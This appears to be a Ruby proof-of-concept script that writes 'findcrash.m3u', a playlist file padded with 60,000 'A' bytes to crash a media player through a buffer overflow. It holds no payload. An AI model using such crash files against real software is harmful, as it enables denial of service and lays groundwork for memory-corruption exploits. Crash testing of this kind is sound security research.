#!/usr/bin/env ruby

file = "findcrash.m3u"

junk = "\x41" * 60000

File.open(file, 'w') {|f| f.write(junk)}
puts "File #{file} was created"